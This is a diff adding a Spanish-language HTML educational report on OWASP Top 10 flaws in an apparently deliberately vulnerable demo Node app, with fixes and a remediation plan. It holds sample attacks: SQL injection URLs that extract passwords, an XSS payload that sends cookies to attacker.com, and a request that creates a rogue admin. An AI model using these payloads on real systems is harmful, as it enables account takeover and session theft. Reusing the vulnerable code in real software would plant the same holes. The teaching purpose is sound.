@@ -1,0 +1,979 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Análisis de Seguridad OWASP Top 10</title>
+        <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      line-height: 1.6;
+      color: #333;
+      background: #f5f5f5;
+    }
+    
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      background: white;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+    }
+    
+    /* Portada */
+    .cover {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      padding: 100px 40px;
+      text-align: center;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .cover h1 {
+      font-size: 3.5em;
+      margin-bottom: 20px;
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+    }
+    
+    .cover .subtitle {
+      font-size: 1.5em;
+      opacity: 0.9;
+      margin-bottom: 40px;
+    }
+    
+    .cover .meta {
+      font-size: 1.1em;
+      opacity: 0.8;
+      margin-top: 60px;
+    }
+    
+    .cover .meta p {
+      margin: 10px 0;
+    }
+    
+    /* Contenido */
+    .content {
+      padding: 60px 40px;
+    }
+    
+    section {
+      margin-bottom: 60px;
+      page-break-inside: avoid;
+    }
+    
+    h1 {
+      color: #667eea;
+      font-size: 2.5em;
+      margin-bottom: 30px;
+      border-bottom: 3px solid #667eea;
+      padding-bottom: 15px;
+    }
+    
+    h2 {
+      color: #764ba2;
+      font-size: 1.8em;
+      margin-top: 30px;
+      margin-bottom: 20px;
+    }
+    
+    h3 {
+      color: #667eea;
+      font-size: 1.3em;
+      margin-top: 20px;
+      margin-bottom: 15px;
+    }
+    
+    p {
+      margin-bottom: 15px;
+      text-align: justify;
+    }
+    
+    .vulnerability {
+      background: #f8f9fa;
+      padding: 30px;
+      border-left: 5px solid #667eea;
+      margin: 20px 0;
+      border-radius: 4px;
+    }
+    
+    .critical {
+      border-left-color: #dc3545;
+      background: #f8d7da;
+    }
+    
+    .high {
+      border-left-color: #fd7e14;
+      background: #fff3cd;
+    }
+    
+    .medium {
+      border-left-color: #ffc107;
+      background: #e7f3ff;
+    }
+    
+    .severity-badge {
+      display: inline-block;
+      padding: 5px 15px;
+      border-radius: 20px;
+      color: white;
+      font-weight: bold;
+      font-size: 0.9em;
+      margin: 0 5px 10px 0;
+    }
+    
+    .severity-critical {
+      background: #dc3545;
+    }
+    
+    .severity-high {
+      background: #fd7e14;
+    }
+    
+    .severity-medium {
+      background: #ffc107;
+      color: #333;
+    }
+    
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 20px 0;
+    }
+    
+    th, td {
+      padding: 12px;
+      text-align: left;
+      border-bottom: 1px solid #ddd;
+    }
+    
+    th {
+      background: #667eea;
+      color: white;
+      font-weight: bold;
+    }
+    
+    tr:hover {
+      background: #f5f5f5;
+    }
+    
+    code {
+      background: #f4f4f4;
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+      color: #d63384;
+    }
+    
+    pre {
+      background: #2c3e50;
+      color: #ecf0f1;
+      padding: 20px;
+      border-radius: 4px;
+      overflow-x: auto;
+      margin: 20px 0;
+      font-size: 0.9em;
+      line-height: 1.4;
+    }
+    
+    .box {
+      background: #e7f3ff;
+      border-left: 4px solid #667eea;
+      padding: 20px;
+      margin: 20px 0;
+      border-radius: 4px;
+    }
+    
+    .box.warning {
+      background: #fff3cd;
+      border-left-color: #ffc107;
+    }
+    
+    .box.danger {
+      background: #f8d7da;
+      border-left-color: #dc3545;
+    }
+    
+    .box.success {
+      background: #d4edda;
+      border-left-color: #28a745;
+    }
+    
+    .toc {
+      background: #f8f9fa;
+      padding: 30px;
+      border-radius: 4px;
+      margin: 30px 0;
+    }
+    
+    .toc ul {
+      list-style: none;
+      margin-left: 0;
+    }
+    
+    .toc li {
+      margin: 10px 0;
+      padding-left: 20px;
+    }
+    
+    .toc li:before {
+      content: "▶ ";
+      color: #667eea;
+      margin-left: -20px;
+      margin-right: 10px;
+    }
+    
+    .toc a {
+      color: #667eea;
+      text-decoration: none;
+    }
+    
+    .toc a:hover {
+      text-decoration: underline;
+    }
+    
+    .impact-table {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 15px;
+      margin: 20px 0;
+    }
+    
+    .impact-item {
+      background: #f8f9fa;
+      padding: 20px;
+      border-radius: 4px;
+      text-align: center;
+      border-top: 3px solid #667eea;
+    }
+    
+    .impact-item h4 {
+      color: #667eea;
+      margin-bottom: 10px;
+    }
+    
+    .impact-value {
+      font-size: 1.5em;
+      font-weight: bold;
+      color: #dc3545;
+    }
+    
+    .footer {
+      background: #2c3e50;
+      color: white;
+      text-align: center;
+      padding: 30px;
+      border-top: 3px solid #667eea;
+    }
+    
+    .page-break {
+      page-break-after: always;
+      margin-top: 50px;
+    }
+    
+    @media (max-width: 768px) {
+      .cover h1 {
+        font-size: 2em;
+      }
+      
+      .impact-table {
+        grid-template-columns: 1fr;
+      }
+    }
+    
+    @media print {
+      body {
+        background: white;
+      }
+      
+      .container {
+        box-shadow: none;
+      }
+    }
+  </style>
+    </head>
+    <body>
+        <div class="container">
+            <!-- PORTADA -->
+            <div class="cover">
+                <h1>🔒 ANÁLISIS DE SEGURIDAD</h1>
+                <p class="subtitle">OWASP Top 10 2021</p>
+                <p class="subtitle" style="font-size: 1.2em;">Aplicación
+                    Vulnerable de Demostración</p>
+                <div class="meta">
+                    <p><strong>Fecha de Análisis:</strong> Diciembre 2025</p>
+                    <p><strong>Clasificación:</strong> Educativa</p>
+                    <p><strong>Vulnerabilidades Identificadas:</strong> 8
+                        CRÍTICAS</p>
+                </div>
+            </div>
+
+            <!-- CONTENIDO -->
+            <div class="content">
+                <!-- RESUMEN EJECUTIVO -->
+                <section>
+                    <h1>📋 Resumen Ejecutivo</h1>
+
+                    <p>Este documento presenta un análisis de seguridad completo
+                        de una aplicación web diseñada específicamente para
+                        demostrar vulnerabilidades del estándar OWASP Top 10. El
+                        análisis se realizó mediante inspección de código
+                        fuente, pruebas funcionales y técnicas de penetración
+                        simples.</p>
+
+                    <h2>Hallazgos Principales</h2>
+
+                    <div class="box danger">
+                        <strong>⚠️ Riesgo General: CRÍTICO</strong><br>
+                        La aplicación contiene vulnerabilidades graves que
+                        permiten acceso no autorizado, manipulación de datos y
+                        exposición de información sensible. No debe utilizarse
+                        en producción bajo ninguna circunstancia.
+                    </div>
+
+                    <h3>Distribución de Vulnerabilidades</h3>
+
+                    <table>
+                        <tr>
+                            <th>Severidad</th>
+                            <th>Cantidad</th>
+                            <th>Porcentaje</th>
+                        </tr>
+                        <tr>
+                            <td><span
+                                    class="severity-badge severity-critical">🔴
+                                    CRÍTICA</span></td>
+                            <td>2</td>
+                            <td>25%</td>
+                        </tr>
+                        <tr>
+                            <td><span class="severity-badge severity-high">🟠
+                                    ALTA</span></td>
+                            <td>5</td>
+                            <td>62.5%</td>
+                        </tr>
+                        <tr>
+                            <td><span class="severity-badge severity-medium">🟡
+                                    MEDIA</span></td>
+                            <td>1</td>
+                            <td>12.5%</td>
+                        </tr>
+                    </table>
+
+                    <h3>Vulnerabilidades Identificadas</h3>
+
+                    <table>
+                        <tr>
+                            <th>ID</th>
+                            <th>Vulnerabilidad</th>
+                            <th>Categoría OWASP</th>
+                            <th>Severidad</th>
+                        </tr>
+                        <tr>
+                            <td>1</td>
+                            <td>SQL Injection</td>
+                            <td>A01:2021</td>
+                            <td><span
+                                    class="severity-badge severity-critical">CRÍTICA</span></td>
+                        </tr>
+                        <tr>
+                            <td>2</td>
+                            <td>Broken Authentication</td>
+                            <td>A07:2021</td>
+                            <td><span
+                                    class="severity-badge severity-critical">CRÍTICA</span></td>
+                        </tr>
+                        <tr>
+                            <td>3</td>
+                            <td>Cross-Site Scripting (XSS)</td>
+                            <td>A03:2021</td>
+                            <td><span
+                                    class="severity-badge severity-high">ALTA</span></td>
+                        </tr>
+                        <tr>
+                            <td>4</td>
+                            <td>Insecure Direct Object References</td>
+                            <td>A01:2021</td>
+                            <td><span
+                                    class="severity-badge severity-high">ALTA</span></td>
+                        </tr>
+                        <tr>
+                            <td>5</td>
+                            <td>Security Misconfiguration</td>
+                            <td>A05:2021</td>
+                            <td><span
+                                    class="severity-badge severity-high">ALTA</span></td>
+                        </tr>
+                        <tr>
+                            <td>6</td>
+                            <td>Sensitive Data Exposure</td>
+                            <td>A02:2021</td>
+                            <td><span
+                                    class="severity-badge severity-high">ALTA</span></td>
+                        </tr>
+                        <tr>
+                            <td>7</td>
+                            <td>Missing Access Controls</td>
+                            <td>A01:2021</td>
+                            <td><span
+                                    class="severity-badge severity-high">ALTA</span></td>
+                        </tr>
+                        <tr>
+                            <td>8</td>
+                            <td>Using Components with Known Vulnerabilities</td>
+                            <td>A06:2021</td>
+                            <td><span
+                                    class="severity-badge severity-medium">MEDIA</span></td>
+                        </tr>
+                    </table>
+                </section>
+
+                <div class="page-break"></div>
+
+                <!-- TABLA DE CONTENIDOS -->
+                <section>
+                    <h1>📑 Tabla de Contenidos</h1>
+
+                    <div class="toc">
+                        <ul>
+                            <li><a href="#res">Resumen Ejecutivo</a></li>
+                            <li><a href="#vulns">Vulnerabilidades Detalladas</a>
+                                <ul>
+                                    <li>SQL Injection</li>
+                                    <li>Broken Authentication</li>
+                                    <li>Cross-Site Scripting (XSS)</li>
+                                    <li>Insecure Direct Object References</li>
+                                    <li>Security Misconfiguration</li>
+                                    <li>Sensitive Data Exposure</li>
+                                    <li>Missing Access Controls</li>
+                                    <li>Using Components with Known
+                                        Vulnerabilities</li>
+                                </ul>
+                            </li>
+                            <li><a href="#conc">Conclusiones y
+                                    Recomendaciones</a></li>
+                            <li><a href="#plan">Plan de Remediación</a></li>
+                        </ul>
+                    </div>
+                </section>
+
+                <div class="page-break"></div>
+
+                <!-- VULNERABILIDADES DETALLADAS -->
+                <section id="vulns">
+                    <h1>🔍 Análisis Detallado de Vulnerabilidades</h1>
+
+                    <div class="vulnerability critical">
+                        <h2>1. SQL INJECTION (A01:2021)</h2>
+                        <span class="severity-badge severity-critical">🔴
+                            CRÍTICA</span>
+                        <span class="severity-badge">CWE-89</span>
+
+                        <h3>Descripción</h3>
+                        <p>Una inyección SQL ocurre cuando entrada no validada
+                            se inserta directamente en consultas de base de
+                            datos, permitiendo a atacantes acceder, modificar o
+                            eliminar datos.</p>
+
+                        <h3>Ubicación</h3>
+                        <p><strong>Endpoint:</strong> <code>GET
+                                /users/search</code><br>
+                            <strong>Parámetro:</strong>
+                            <code>username</code></p>
+
+                        <h3>Código Vulnerable</h3>
+                        <pre>app.get('/users/search', (req, res) => {
+  const username = req.query.username;
+  // ⚠️ VULNERABLE: Interpolación directa
+  const query = `SELECT id, username, email FROM users 
+                 WHERE username = '${username}'`;
+  db.get(query, (err, row) => {
+    res.json(row || { message: 'Not found' });
+  });
+});</pre>
+
+                        <h3>Impacto Potencial</h3>
+                        <div class="impact-table">
+                            <div class="impact-item">
+                                <h4>Confidencialidad</h4>
+                                <div class="impact-value">🔴 COMPROMETIDA</div>
+                            </div>
+                            <div class="impact-item">
+                                <h4>Integridad</h4>
+                                <div class="impact-value">🔴 COMPROMETIDA</div>
+                            </div>
+                            <div class="impact-item">
+                                <h4>Disponibilidad</h4>
+                                <div class="impact-value">🔴 COMPROMETIDA</div>
+                            </div>
+                        </div>
+
+                        <h3>Ejemplo de Ataque</h3>
+                        <pre>URL: /users/search?username=admin' --
+Resultado: Retorna admin sin validación
+
+URL: /users/search?username=' UNION SELECT 1,password FROM users --
+Resultado: Extrae todas las contraseñas</pre>
+
+                        <h3>Corrección Recomendada</h3>
+                        <pre>// ✓ SEGURO: Usar prepared statements
+const query = "SELECT id, username, email FROM users WHERE username = ?";
+db.get(query, [username], (err, row) => {
+  res.json(row || { message: 'Not found' });
+});</pre>
+                    </div>
+
+                    <div class="vulnerability critical">
+                        <h2>2. BROKEN AUTHENTICATION (A07:2021)</h2>
+                        <span class="severity-badge severity-critical">🔴
+                            CRÍTICA</span>
+                        <span class="severity-badge">CWE-287</span>
+
+                        <h3>Descripción</h3>
+                        <p>Autenticación débil permite asumir identidades, con
+                            tokens predecibles y credenciales expuestas en
+                            logs.</p>
+
+                        <h3>Vulnerabilidades Específicas</h3>
+
+                        <h4>a) Tokens Débiles (Base64 simple)</h4>
+                        <p>Token para usuario ID 1: <code>MQ==</code> (base64
+                            para "1")</p>
+                        <p>Cualquiera puede predecir tokens: MQ==, Mg==, Mw==
+                            ...</p>
+
+                        <h4>b) Credenciales en Logs</h4>
+                        <pre>[LOG] Login attempt - Username: admin, Password: password123</pre>
+                        <p>Contraseñas visibles en archivos de registro del
+                            servidor.</p>
+
+                        <h4>c) Sin Validación de Sesión</h4>
+                        <p>No hay verificación de token en solicitudes
+                            posteriores.</p>
+
+                        <h3>Impacto</h3>
+                        <ul>
+                            <li>✗ Suplantación de identidad</li>
+                            <li>✗ Acceso no autorizado</li>
+                            <li>✗ Exposición de credenciales</li>
+                            <li>✗ Fuerza bruta sin límite</li>
+                        </ul>
+
+                        <h3>Corrección Recomendada</h3>
+                        <pre>// ✓ Usar JWT con expiración
+const jwt = require('jsonwebtoken');
+
+app.post('/login', (req, res) => {
+  // ... validar credenciales ...
+  const token = jwt.sign(
+    { userId: user.id, role: user.role },
+    process.env.JWT_SECRET,
+    { expiresIn: '1h' }
+  );
+  res.json({ success: true, token });
+});</pre>
+                    </div>
+
+                    <div class="vulnerability high">
+                        <h2>3. CROSS-SITE SCRIPTING (XSS) (A03:2021)</h2>
+                        <span class="severity-badge severity-high">🟠
+                            ALTA</span>
+                        <span class="severity-badge">CWE-79</span>
+
+                        <h3>Descripción</h3>
+                        <p>XSS permite inyectar JavaScript que se ejecuta en
+                            navegadores de otros usuarios.</p>
+
+                        <h3>Payloads Posibles</h3>
+                        <pre>&lt;img src=x onerror="alert('XSS')"&gt;
+&lt;script&gt;fetch('http://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</pre>
+
+                        <h3>Corrección</h3>
+                        <pre>// Escapar HTML
+const escapeHtml = (text) => text
+  .replace(/&/g, '&amp;')
+  .replace(/</g, '&lt;')
+  .replace(/>/g, '&gt;');
+
+// O usar CSP headers
+res.setHeader('Content-Security-Policy', 
+  "default-src 'self'; script-src 'self'");</pre>
+                    </div>
+
+                    <div class="vulnerability high">
+                        <h2>4. INSECURE DIRECT OBJECT REFERENCES (IDOR)
+                            (A01:2021)</h2>
+                        <span class="severity-badge severity-high">🟠
+                            ALTA</span>
+                        <span class="severity-badge">CWE-639</span>
+
+                        <h3>Descripción</h3>
+                        <p>Acceso directo a objetos sin verificar autorización
+                            permite ver datos de otros usuarios.</p>
+
+                        <h3>Ataque</h3>
+                        <pre>GET /notes/1 → Acceso a nota del admin sin permiso
+GET /api/user/1 → Ver datos de cualquier usuario</pre>
+
+                        <h3>Corrección</h3>
+                        <pre>app.get('/notes/:id', (req, res) => {
+  const { id } = req.params;
+  const userId = req.user.id; // Del JWT
+  
+  db.get(
+    `SELECT * FROM notes WHERE id = ? AND user_id = ?`,
+    [id, userId],
+    (err, note) => {
+      if (!note) return res.status(403).send('Forbidden');
+      res.json(note);
+    }
+  );
+});</pre>
+                    </div>
+
+                    <div class="vulnerability high">
+                        <h2>5. SECURITY MISCONFIGURATION (A05:2021)</h2>
+                        <span class="severity-badge severity-high">🟠
+                            ALTA</span>
+                        <span class="severity-badge">CWE-16</span>
+
+                        <h3>Exposición de Información Sensible</h3>
+                        <p>El endpoint <code>/debug</code> expone:</p>
+                        <pre>{
+  "secretKey": "super-secret-key-12345",
+  "databasePath": ":memory:",
+  "environment": "development"
+}</pre>
+
+                        <h3>Riesgo</h3>
+                        <p>Atacante obtiene secret key y puede generar tokens
+                            válidos para cualquier usuario.</p>
+
+                        <h3>Corrección</h3>
+                        <pre>if (process.env.NODE_ENV === 'production') {
+  // Deshabilitar endpoint
+  app.get('/debug', (req, res) => {
+    res.status(404).send('Not found');
+  });
+}</pre>
+                    </div>
+
+                    <div class="vulnerability high">
+                        <h2>6. SENSITIVE DATA EXPOSURE (A02:2021)</h2>
+                        <span class="severity-badge severity-high">🟠
+                            ALTA</span>
+                        <span class="severity-badge">CWE-200</span>
+
+                        <h3>Datos Expuestos</h3>
+                        <pre>GET /api/user/1 retorna:
+{
+  "id": 1,
+  "username": "admin",
+  "password": "$2a$10$...",  ← ¡Hash visible!
+  "email": "admin@example.com",
+  "role": "admin"             ← ¡Identifica admins!
+}</pre>
+
+                        <h3>Corrección</h3>
+                        <pre>// Filtrar datos sensibles
+const safeUser = {
+  id: user.id,
+  username: user.username,
+  email: user.email
+  // Sin password, sin role
+};
+res.json(safeUser);</pre>
+                    </div>
+
+                    <div class="vulnerability high">
+                        <h2>7. MISSING ACCESS CONTROLS (A01:2021)</h2>
+                        <span class="severity-badge severity-high">🟠
+                            ALTA</span>
+                        <span class="severity-badge">CWE-276</span>
+
+                        <h3>Problema</h3>
+                        <p>Endpoint <code>POST /admin/users</code> accesible sin
+                            autenticación.</p>
+
+                        <h3>Ataque</h3>
+                        <pre>POST /admin/users
+{
+  "username": "hacker",
+  "email": "hacker@evil.com",
+  "role": "admin"
+}
+
+Respuesta: Usuario admin creado exitosamente!</pre>
+
+                        <h3>Corrección</h3>
+                        <pre>const requireAdmin = (req, res, next) => {
+  if (!req.user || req.user.role !== 'admin') {
+    return res.status(403).send('Forbidden');
+  }
+  next();
+};
+
+app.post('/admin/users', requireAdmin, (req, res) => {
+  // ... crear usuario como usuario normal (no admin)
+});</pre>
+                    </div>
+
+                    <div class="vulnerability medium">
+                        <h2>8. USING COMPONENTS WITH KNOWN VULNERABILITIES
+                            (A06:2021)</h2>
+                        <span class="severity-badge severity-medium">🟡
+                            MEDIA</span>
+                        <span class="severity-badge">CWE-1035</span>
+
+                        <h3>Componentes con Potenciales Vulnerabilidades</h3>
+                        <table>
+                            <tr>
+                                <th>Componente</th>
+                                <th>Versión</th>
+                                <th>Riesgo</th>
+                            </tr>
+                            <tr>
+                                <td>express</td>
+                                <td>4.18.2</td>
+                                <td>Posibles issues menores</td>
+                            </tr>
+                            <tr>
+                                <td>sqlite3</td>
+                                <td>5.1.6</td>
+                                <td>Potencial para inyecciones</td>
+                            </tr>
+                            <tr>
+                                <td>bcryptjs</td>
+                                <td>2.4.3</td>
+                                <td>Timing attacks</td>
+                            </tr>
+                        </table>
+
+                        <h3>Corrección</h3>
+                        <pre>npm audit
+npm update
+npm audit fix
+
+# Usar herramientas:
+# - Dependabot
+# - Snyk
+# - WhiteSource</pre>
+                    </div>
+                </section>
+
+                <div class="page-break"></div>
+
+                <!-- CONCLUSIONES -->
+                <section id="conc">
+                    <h1>📊 Conclusiones y Recomendaciones</h1>
+
+                    <h2>Hallazgos Clave</h2>
+
+                    <ol>
+                        <li><strong>SQL Injection es crítica</strong> - Permite
+                            acceso completo a datos
+                            <li><strong>Autenticación débil</strong> - Tokens
+                                predecibles y credenciales expuestas
+                                <li><strong>XSS permite robo de
+                                        sesiones</strong> - JavaScript
+                                    ejecutable en navegadores
+                                    <li><strong>Falta de controles de
+                                            acceso</strong> - Escalación a admin
+                                        posible
+                                        <li><strong>Información sensible
+                                                expuesta</strong> - En múltiples
+                                            endpoints
+                                        </ol>
+
+                                        <h2>Matriz de Riesgo</h2>
+
+                                        <pre>IMPACTO
+  ↑
+  │ ★ SQL Injection      ★ Broken Auth
+  │ ★ Missing Access     ★ IDOR
+  │ ★ XSS               ★ Sensitive Data
+  │ ★ Config            
+  └─────────────────────────→ PROBABILIDAD
+
+★ = Vulnerabilidad confirmada</pre>
+
+                                        <div class="box danger">
+                                            <strong>⚠️ VEREDICTO
+                                                FINAL</strong><br>
+                                            Esta aplicación tiene un nivel de
+                                            riesgo CRÍTICO y no debe utilizarse
+                                            en ningún ambiente sin correcciones
+                                            significativas.
+                                        </div>
+                                    </section>
+
+                                    <!-- PLAN DE REMEDIACIÓN -->
+                                    <section id="plan">
+                                        <h1>🛠️ Plan de Remediación</h1>
+
+                                        <h2>Fase 1: CRÍTICO (1-2 semanas)</h2>
+                                        <ul>
+                                            <li>✓ Usar prepared statements en
+                                                todas las queries SQL</li>
+                                            <li>✓ Implementar JWT con
+                                                expiración</li>
+                                            <li>✓ Añadir validación de
+                                                autorización en endpoints
+                                                críticos</li>
+                                            <li>✓ No exponer información
+                                                sensible en respuestas</li>
+                                        </ul>
+
+                                        <h2>Fase 2: ALTO (2-4 semanas)</h2>
+                                        <ul>
+                                            <li>✓ Sanitizar salida HTML (escapar
+                                                caracteres)</li>
+                                            <li>✓ Implementar HTTPS
+                                                obligatorio</li>
+                                            <li>✓ Añadir Content Security Policy
+                                                headers</li>
+                                            <li>✓ No registrar credenciales en
+                                                logs</li>
+                                        </ul>
+
+                                        <h2>Fase 3: MEDIO (1-2 meses)</h2>
+                                        <ul>
+                                            <li>✓ Audit de componentes con
+                                                vulnerabilidades</li>
+                                            <li>✓ Actualizar todas las
+                                                dependencias</li>
+                                            <li>✓ Implementar logging de eventos
+                                                de seguridad</li>
+                                            <li>✓ Realizar pruebas de seguridad
+                                                regular</li>
+                                        </ul>
+
+                                        <h2>Controles de Seguridad
+                                            Recomendados</h2>
+
+                                        <table>
+                                            <tr>
+                                                <th>Control</th>
+                                                <th>Implementación</th>
+                                                <th>Prioridad</th>
+                                            </tr>
+                                            <tr>
+                                                <td>Input Validation</td>
+                                                <td>Validar y sanitizar todos
+                                                    los inputs</td>
+                                                <td>Crítica</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Output Encoding</td>
+                                                <td>Escapar salida para prevenir
+                                                    XSS</td>
+                                                <td>Crítica</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Authentication</td>
+                                                <td>JWT seguro con
+                                                    expiración</td>
+                                                <td>Crítica</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Authorization</td>
+                                                <td>Verificar permisos en cada
+                                                    acción</td>
+                                                <td>Crítica</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Error Handling</td>
+                                                <td>No exponer detalles
+                                                    técnicos</td>
+                                                <td>Alta</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Logging</td>
+                                                <td>Registrar eventos de
+                                                    seguridad</td>
+                                                <td>Alta</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Dependencies</td>
+                                                <td>Mantener actualizado y
+                                                    auditado</td>
+                                                <td>Alta</td>
+                                            </tr>
+                                        </table>
+                                    </section>
+
+                                    <div class="page-break"></div>
+
+                                    <!-- REFERENCIAS -->
+                                    <section>
+                                        <h1>📚 Referencias</h1>
+
+                                        <h2>Estándares y Guías OWASP</h2>
+                                        <ul>
+                                            <li>OWASP Top 10 2021 -
+                                                https://owasp.org/Top10/</li>
+                                            <li>OWASP Testing Guide -
+                                                https://owasp.org/www-project-web-security-testing-guide/</li>
+                                            <li>OWASP Cheat Sheets -
+                                                https://cheatsheetseries.owasp.org/</li>
+                                        </ul>
+
+                                        <h2>CWE/CVE References</h2>
+                                        <ul>
+                                            <li>CWE-89: SQL Injection</li>
+                                            <li>CWE-287: Improper
+                                                Authentication</li>
+                                            <li>CWE-79: Cross-site
+                                                Scripting</li>
+                                            <li>CWE-639: Authorization
+                                                Bypass</li>
+                                            <li>CWE-16: Configuration</li>
+                                            <li>CWE-200: Information
+                                                Exposure</li>
+                                            <li>CWE-276: Incorrect Default
+                                                Permissions</li>
+                                            <li>CWE-1035: Using Components with
+                                                Vulnerabilities</li>
+                                        </ul>
+
+                                        <h2>Herramientas Utilizadas</h2>
+                                        <ul>
+                                            <li>Mozilla Firefox DevTools</li>
+                                            <li>Google Chrome DevTools</li>
+                                            <li>cURL / Postman</li>
+                                            <li>VS Code</li>
+                                            <li>Node.js</li>
+                                        </ul>
+
+                                        <h2>Recursos Adicionales</h2>
+                                        <ul>
+                                            <li>Portswigger Web Security Academy
+                                                -
+                                                https://portswigger.net/web-security</li>
+                                            <li>HackTheBox -
+                                                https://www.hackthebox.com/</li>
+                                            <li>TryHackMe -
+                                                https://tryhackme.com/</li>
+                                        </ul>
+                                    </section>
+                                </div>
+
+                                <!-- FOOTER -->
+                                <div class="footer">
+                                    <p><strong>Análisis de Seguridad OWASP Top
+                                            10</strong></p>
+                                    <p>Documento Confidencial - Uso Educativo
+                                        Únicamente</p>
+                                    <p>Generado: Diciembre 2025</p>
+                                </div>
+                            </div>
+                        </body>
+                    </html>
